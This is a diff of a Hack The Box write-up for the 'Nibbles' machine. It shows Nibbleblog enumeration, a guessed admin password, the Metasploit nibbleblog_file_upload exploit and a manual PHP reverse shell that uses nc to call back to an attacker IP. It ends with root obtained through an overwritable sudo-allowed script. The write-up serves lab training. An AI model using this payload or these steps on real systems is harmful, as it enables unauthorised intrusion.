@@ -16,7 +16,7 @@ Contents:
 
 =======================================================
 
-Broad introduction to the machine.
+Nibbles provides us a straightforward example of researching software we encounter along the way and then enumerating additional details to determine whether the specific configuration we are up against is vulnerable or not. 
 
 <p>&nbsp;</p>
 =======================================================
@@ -25,21 +25,25 @@ Broad introduction to the machine.
 
 =======================================================
 
-Summary paragraph.
+For Nibbles we will take a look at a particular type of blogging software, discover the running version on our target and then use both Metasploit and manual methods to trigger a remote shell. A sudo misconfiguration allows us to escalate to root. 
 
 -1- nmap
 
--2- 
+-2- searchsploit
 
--3- 
+-3- msfconsole
 
--4- 
+-4- dirbuster
 
--5- 
+-5- msf module: exploit/multi/http/nibbleblog_file_upload
 
--6- 
+-6- .sh scripting
 
--7- 
+-7- .php reverse shell
+
+-8- nc
+
+-9- sudo misconfiguration
 
 <p>&nbsp;</p>
 =======================================================
@@ -58,21 +62,21 @@ Browse to the website:
 
 ![](/images/nibbles/3. website.png)
 
-View page source because this is rather bland:
+View page source because this is not much to work with (Use the source, Luke!):
 
 ![](/images/nibbles/3. website_source.png)
 
-Okay, here we have a comment in the code...let's check out http://10.10.10.75/nibbleblog/
+Here we have a comment in the code pointing us towards /nibbleblog/ so let's check out http://10.10.10.75/nibbleblog/
 
 ![](/images/nibbles/4. nibbleblog.png)
 
-Okay we have some sort of an application here. It looks like a blog (based on the name, and features).  In the lower right we see “Powered by Nibbleblog” so let's searchsploit for that:
+We have some sort of an application here. It looks like a blog (based on the name, and features). In the lower right we see “Powered by Nibbleblog” so let's searchsploit for that:
 
     searchsploit nibbleblog
 
 ![](/images/nibbles/5. searchsploit.png)
 
-There is a remote Arbitrary File Upload for Nibbleblog 4.0.3, and a Metasploit module for it.  Let's load the module and see what else we can learn:
+There is a remote Arbitrary File Upload for Nibbleblog 4.0.3, and a Metasploit module for it. Let's load the module and see what else we can learn:
 
     msfconsole
 
@@ -88,7 +92,7 @@ Now let's show some info:
 
 ![](/images/nibbles/7. info.png)
 
-The exploit requires valid credentials ("authenticated remote attacker"), so we need to enumerate and look for valid creds. This also means there is likely a login portal or app that we should be able to find to use the creds on. We'll fire up dirbuster:
+The exploit requires valid credentials ("authenticated remote attacker"), so we need to enumerate and look for valid creds. This also means there is likely a login portal or app that we should be able to find to use the creds on. Time to fire up dirbuster:
 
     dirbuster &
 
@@ -130,20 +134,19 @@ Okay, users.xml looks interesting, maybe it will have a list of users?
 
 ![](/images/nibbles/13. users_xml.png)
 
-Okay, we have a username, “admin”.  Now what for a password?  Unfortunately, none of the other files seem to shed any light. After some educated guessing we arrive with a successful login of:
+Here we have a username, “admin”.  Now what for a password? Unfortunately, none of the other files seem to shed any light. After some educated guessing we arrive with a successful login of:
 
 admin : nibbles
 
 ![](/images/nibbles/14. dashboard.png)
 
-And we're in!  Turns out the password “nibbles” was right in front of us several times throughout. Now let's search for a version to confirm whether or not we can use our Metasploit module.
+And we're in! Turns out the password “nibbles” was right in front of us from the beginning (again, HTB with the name of the box as a clue). Now let's search for a version to confirm whether or not we can use our Metasploit module.
 
 In the above screenshot there is a Settings page on the left side, click it.
 
 ![](/images/nibbles/15. version.png)
 
-If you scroll down on the Settings page you will eventually see the above.  Version is 4.0.3 which means our Metasploit module should work. Let's give it a shot.
-
+If you scroll down on the Settings page you will eventually see the above. Version is 4.0.3 which means our Metasploit module should work. Let's give it a shot.
 
 <p>&nbsp;</p>
 =======================================================
@@ -169,13 +172,13 @@ Return to your terminal window with msfconsole, or load it up again:
 ![](/images/nibbles/16. msf_set.png)
 ![](/images/nibbles/16. msf_set_2.png)
 
-All of our options look set properly.  Let's give this a try:
+All of our options look proper. Let's give this a try:
 
     run
 
 ![](/images/nibbles/17. run.png)
 
-And we have a meterpreter shell!  If your exploit stalls at the “[+] Deleted image.php” step, do n0t worry. Just give it a moment and your meterpreter prompt should appear.
+And we have a meterpreter shell!  If your exploit stalls at the “[+] Deleted image.php” step, do not worry. Just give it a moment and your meterpreter prompt should appear.
 
 Now for some enum:
 
@@ -201,7 +204,9 @@ We are low-privileged user “nibbler”, so let's start by going to our home fo
 
 ![](/images/nibbles/20. home.png)
 
-Okay so ignore anything that has a date of May 5 here as others were working on the box and did not clean up after themselves. We do see user.txt here so let's grab that flag:
+Learning point: Here you can see LinEnum.sh and linuxprivchecker.py are in /home/nibbler/ which means others were working on the box and did not clean up after themselves. Please do not be that gal or guy...
+
+We do see user.txt here so let's grab that flag:
 
     cat user.txt
 
@@ -215,7 +220,6 @@ Time to enumerate a path for privilege escalation. There is nothing in .bash_his
 
 ![](/images/nibbles/22. unzip.png)
 
-
 Let's see what permissions we have to monitor.sh:
 
     ls -la personal/stuff
@@ -226,7 +230,9 @@ We own the file and can read/write/execute it at will. When you cat it though, t
 
 ![](/images/nibbles/24. sudo_l.png)
 
-And we can run the monitor.sh command root. Now all we need to do is replace it's current contents with something that will give us a shell. Even something simple like: bash -i
+Here we see user nibbler can run the monitor.sh from /home/nibbler/personal/stuff/ as root without a password. The lack of a required password represents a sudo misconfiguration. 
+
+Now all we need to do is replace the script's current contents with something that will give us a shell. Even something simple like: bash -i
 
     cd personal/stuff
 
@@ -236,20 +242,21 @@ And we can run the monitor.sh command root. Now all we need to do is replace it'
 
     sudo /home/nibbler/personal/stuff/monitor.sh
 
+Note: If you move monitor.sh to another directory, your sudo command will not work. Also, as a best practice when using sudo, give the the full path to the file/script you want to execute.
+
 ![](/images/nibbles/26. monitor.png)
 
     id
 
 ![](/images/nibbles/27. id.png)
 
-Success! We are root.  Let's go get our root flag:
+Success! We are root. Let's go get our root flag:
 
     cat /root/root.txt
 
 ![](/images/nibbles/28. root_flag.png)
 
 And we have our root flag.
-
 
 <p>&nbsp;</p>
 =======================================================
@@ -258,26 +265,25 @@ And we have our root flag.
 
 =======================================================
 
-
-For manual exploitation we are going to exploit the same vulnerability used by the metasploit module by uploading a malicious .php file using the credentials from our enumeration:  admin : nibbles
+For manual exploitation we are going to exploit the same vulnerability used by the metasploit module by uploading a malicious .php file using the credentials from our enumeration: admin : nibbles
 
 First, log back into the nibbleblog dashboard at: http://10.10.10.75/nibbleblog/admin.php
 
 ![](/images/nibbles/29. dashboard.png)
 
-Back on the Dashboard of the admin login, we see a “Plugins” section on the left side.  Click it.
+Back on the Dashboard of the admin login, we see a “Plugins” section on the left side. Click it.
 
 Under the My Image plugin, click Configure
 
 ![](/images/nibbles/30. plugins.png)
 
-Here we can upload a maclicious php file to gain a reverse shell.  We can look-up php one-liners and then create a php file to do what we need. In this case I took a /bin/sh one-liner and added nc execution to call back to my attacking machine, then wrapped it in a php system command.
+Here we can upload a maclicious php file to gain a reverse shell.  We can look-up php one-liners and then create a php file to do what we need. In this case I took a /bin/sh one-liner and added nc execution to call back to my attacking machine, then wrapped it in a php system command. This is not the simplest one-liner you can use here, but it works:
 
     <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.24 17011 >/tmp/f"); ?>
 
 ![](/images/nibbles/31. php_file.png)
 
-Create a .php file (call-back.php in my case) and put the above code into it.  Save it and then use the nibbleblog myimage plugin to upload it: 
+Create a .php file (call-back.php in my case) and put the above code into it. Save it and then use the nibbleblog My Image plugin to upload it: 
 
 Click “Browse” then select the call-back.php file
 
@@ -287,7 +293,7 @@ Now we are ready to trigger the php file. Set up your nc listener in a Kali term
 
     nc -lvnp 17011
 
-Then navigate to the following:  http://10.10.10.75/nibbleblog/content/private/plugins/my_image/
+Then navigate to the following: http://10.10.10.75/nibbleblog/content/private/plugins/my_image/
 
 ![](/images/nibbles/32. myimage.png)
 
@@ -310,7 +316,7 @@ Here we can grab the user flag:
 
 ![](/images/nibbles/35. user.png)
 
-The file personal.zip looks interesting, so let's extract it:
+As before, the file /home/nibbler/personal.zip looks interesting, so let's extract it:
     
     unzip personal.zip
 
@@ -346,7 +352,6 @@ Success!  Let's go get our root flag:
 
 And here we have our flags.
 
-
 <p>&nbsp;</p>
 =======================================================
 
@@ -357,7 +362,6 @@ And here we have our flags.
 call-back.php:
 
       <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.24 17011 >/tmp/f"); ?>
-        
 
 <p>&nbsp;</p>
 =======================================================
@@ -366,11 +370,7 @@ call-back.php:
 
 =======================================================
 
-1. Link: []()
-2. Link: []()
-3. Link: []()
-4. Link: []()
-5. Link: []()
+1. Rapid7 Metasploit module entry: [https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload](https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload)
 
 <p>&nbsp;</p>
 =======================================================
